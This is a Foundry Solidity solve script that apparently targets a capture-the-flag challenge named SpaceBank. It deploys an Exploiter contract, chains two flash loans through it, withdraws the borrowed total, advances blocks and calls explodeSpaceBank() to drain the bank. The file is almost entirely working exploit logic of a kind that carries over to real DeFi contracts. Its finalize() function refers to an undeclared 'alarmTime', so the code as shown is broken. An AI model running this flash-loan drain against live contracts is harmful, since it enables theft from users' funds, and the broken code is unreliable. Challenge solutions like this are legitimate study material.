// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

import "src/Challenge.sol";
import "src/SpaceBank.sol";
import "src/Exploiter.sol";

contract SolveScript is Script {
    Challenge challenge = Challenge(0xc8351Ee7396220BD2deE646B876f42eCEcc2be8F);
    SpaceBank spacebank = challenge.SPACEBANK();

    function run() public {
        vm.startBroadcast();

        Exploiter exploiter = new Exploiter{value: 1}(spacebank);
        spacebank.flashLoan(500, address(exploiter));
        spacebank.flashLoan(500, address(exploiter));
        exploiter.withdraw(1000);
        vm.roll(block.number + 2);
        spacebank.explodeSpaceBank();

        vm.stopBroadcast();
    }

    function finalize() public {
        vm.startBroadcast();

        if (block.number == alarmTime + 2) {
            spacebank.explodeSpaceBank();
        }
        assert(challenge.isSolved());

        vm.stopBroadcast();
    }
}
